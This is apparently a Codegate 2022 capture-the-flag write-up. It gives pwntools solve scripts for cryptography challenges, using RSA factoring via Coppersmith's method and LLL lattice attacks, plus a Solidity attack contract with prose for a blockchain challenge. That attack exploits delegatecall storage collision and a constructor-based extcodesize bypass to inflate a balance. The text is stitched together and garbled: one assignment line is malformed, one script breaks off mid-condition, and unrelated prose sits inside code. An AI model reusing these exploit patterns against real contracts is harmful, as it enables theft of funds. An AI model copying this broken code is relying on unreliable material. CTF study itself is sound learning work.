r = remote(HOST,POST)
r.recvuntil(b'>')
r.sendline(b'2')
n = r.recvline()
c = r.recvline()
print(n)
print(c)
sieve = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 
79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 
173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229]
res = [list(range(k)) for k in sieve]
m = [-pow(2,-216,k)%k for k in sieve]
while True:
    try:
        for _ in range(30):
            r.recvuntil(b'>')
            r.sendline(b'1')
            r.recvuntil(b'>')
            r.sendline(b'10')
            for i in range(10): 
                x = int(r.recvline())
                for j in range(49):
                    y = x*m[j]%sieve[j]
                    if y in res[j]:
                        z = res[j].index(y)
                        res[j].pop(z)
        print(n)
        print(c)
        print(res)
        for _ in res:
            if len(_)!=1:
                break
        else:
            break
    except:
        break
for i in range(49):
    res[i] = res[i][0]
print(n)
print(c)
print(res)
try:
    r.interactive()
except:
    pass
b' n : 
100201892937190481079718907146265229883252498506894954586497353837548111285943200631109
728707986562638444064517835258160420469317107219683957245076750197450444342387037734237
960394485624628525228618959607076390653979104938671165337048728576350651433068084787815
393631381235510601698007250328357644230082117239\n'
b'c : 
189218329124858971485575550454686794263161412000576227398596730421150559986456170869569
368656105224656977939259741904841683472590246611266327795125886629182509119523104810383
017795639170856616388470172460009183674769563913796235502445391752917823379429174729853
18349161196423441379524909544404090660791508440\n'
[2, 0, 0, 8, 2, 6, 18, 14, 14, 30, 6, 16, 22, 39, 3, 24, 55, 31, 16, 18, 76, 9, 6, 10, 
28, 56, 86, 76, 54, 26, 59, 2, 22, 78, 142, 10, 100, 118, 22, 9, 141, 107, 48, 18, 136, 
108, 210, 155, 9]
sieve = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 
79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 
173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229]
res = [2, 0, 0, 8, 2, 6, 18, 14, 14, 30, 6, 16, 22, 39, 3, 24, 55, 31, 16, 18, 76, 9, 
6, 10, 28, 56, 86, 76, 54, 26, 59, 2, 22, 78, 142, 10, 100, 118, 22, 9, 141, 107, 48, 
18, 136, 108, 210, 155, 9]
upper = crt(res,sieve) = PolynomialRing(Zmod(n))
f = x+upper
p0 = f.small_roots(X=2**216,beta=0.4)
p = int(p0[0]+upper)
q = int(n/p)
print(p,q)
m = int(pow(c,int(pow(65537,-1,(p-1)*(q-1))),n))
print(m)
print(int.to_bytes(m,128,'big'))
Dark Arts
780235001889555114898959217422051691351338489853576296884924076804774816700041466375679
8786962671240717642828873560322578155026153690436598563274505670931 
128425272763364691467838740681474835135365539143802401855195312131272422598401457074763
81279155769509226989276902042308067590429066547857653623865247133069
272756718119210248318167765820120656039891252824446272020278885296412260766403487438542
646211679493756809438487675709386023072564805290060659574740912316444068794217071445087
280639680479807105143279201578299153346562008100623716979617977883434235945596528646056
199976942288793541287074565257025993209932892
b'\x00codegate2022{ef9fdfaae10f7afe84bea52307966a9e}\x00\'\xcd"v\xcd\xdbY\xb0\x82D\xab\
x1ag\'\xfe\x1b\xf8\xc0,\x83\x11\xaa\x89\x9b^\xdb\x10\x1a\x15\xc6\xe0\xd5\x84-
\xb2z\xd1\xb2f\xc6\x0f\x0bw\xab\xe9\xef!\xd9\xba9\xb4\x88\xd7\xb0\x14\xa3uQ\x86\x02\xf5
\xde\xb1e\xf9t\xbf\xcf\x18\x19\xbf\xf2\x17\x19\x0fX@E\xec\\'
from pwn import *
from Crypto.Util.number import *
from tqdm import trange
import hashlib
import time
HOST = "13.209.188.120"
POST = 9003
r = remote(HOST,POST)
# r = process(['python', 'chal.py'])
# Chapter 1
print(r.recvline())
for _ in trange(64):
    result = 0
    for i in range(10):
        r.sendline(b'0')
        r.sendline(str(2**i).encode())
    lines = r.recvlines(10)
    for line in lines:
        result += int(line.strip())
    if result != 0:
        r.sendline(b'1')
        r.sendline(b'1')
    else:
        r.sendline(b'1')
        r.sendline(b'0')
print("Chapter 1 completed")
# Chapter 2
print(r.recvline())
for _ in trange(64):
    res = [0]*5
    for i in range(2000):
        r.sendline(b'0')
        r.sendline(str(i).encode())
    lines = r.recvlines(2000)
    for line in lines:
        res[int(line.strip())] += 1
    s = 0
    for i in range(5):
        s += (res[i]-400)**2
    # print(s)
    if s =2144:
            if A3.rank()==2144:
                break
b3 = [3]*k + [0]*(2200-k)
ans = A3.solve_right(b3)[:64]
print('my:',ans)
r.sendline(b'1')
for i in range(64):
    r.sendline(str((5-int(ans[i]))%5).encode())
Blockchain
Ankiwoom Invest
Using the feature of delegatecall,modifying the log.info is modifying the donator.length.The calculate 
method of mapping is sha3(key.pos),so the array is stored in sha3(pos)+index.Try some times until get a 
suitable contract address which satisfies the slot position of balance[msg.sender] is after 
donator[0].Overwrite the value of proxy contract slot2 to bypass length check of donator.Then, use 
modifyDonater(uint256) to change the slot value of balance[msg.sender],and index fills in the value of 
sha3(msg.sender.pos(7))-sha3(pos(2)).We can get enough balance to solve the problem.
The extcodesize(_user) is bypassed by writing the call in the constructor.
# Chapter 4
print(r.recvline())
p = int(r.recvline().strip())
q = int(r.recvline().strip())
A4 = matrix(ZZ,51,51)
A4[0,0] = 1<<800
for i in range(16):
    A4[i+1,i+1] = 1
for i in range(34):
    r.sendline(b'0')
    r.sendline(str(i).encode())
    A4[i+17,0] = int(r.recvline().strip())<<400
    x = hashlib.sha256(str(i).encode()).digest()
    for j in range(16):
        A4[i+17,j+1] = int.from_bytes(x, "big")<<400
        x = hashlib.sha256(x).digest()
    A4[i+17,i+17] = p<<400
C4 = A4.transpose().LLL()
print(C4[-1])
r.sendline(b'1')
for i in range(16):
    print(b'my', str(int(-C4[-1][i+1])%p).encode())
    r.sendline(str(int(-C4[-1][i+1])%p).encode())
r.interactive()
pragma solidity ^0.8.0;
contract attack{
    address public target1 = 0xa5b42cD5348f2C3Df5409177FAa4e7Bb1C0bB08C;
    // address public target2 = 0x26a77595Aa80350af52A14116E197E53b8B92601; // invest
    // function launch1() public{
    //     (bool success0, bytes memory result0) = 
target1.call(abi.encodeWithSignature("init()"));
    //     require(success0,"fail0");
    // }
    constructor() public {
        // (bool success0, bytes memory result0) = 
target1.call(abi.encodeWithSignature("init()"));
        // require(success0,"fail0");
        (bool success, bytes memory result) = 
target1.call(abi.encodeWithSignature("mint()"));
        require(success,"fail");
        string memory name = "amd";
        (bool success1, bytes memory result1) = 
target1.call(abi.encodeWithSignature("buyStock(string,uint256)",name,1));
        require(success1,"fail1");
        (bool success2, bytes memory result2) = 
target1.call(abi.encodeWithSignature("donateStock(address,string,uint256)",address(0),n
ame,1));
        require(success2,"fail2");
    }
    function launch3(uint index) public returns(bytes memory){
        (bool success, bytes memory result) = 
target1.call(abi.encodeWithSignature("modifyDonater(uint256)",index));
        require(success,"fail");
        string memory name = "codegate";
        (bool success1, bytes memory result1) = 
target1.call(abi.encodeWithSignature("buyStock(string,uint256)",name,1));
        require(success1,"fail1");
        (bool success2, bytes memory result2) = 
target1.call(abi.encodeWithSignature("isSolved()"));
        require(success2,"fail2");
        return result2;
    }
}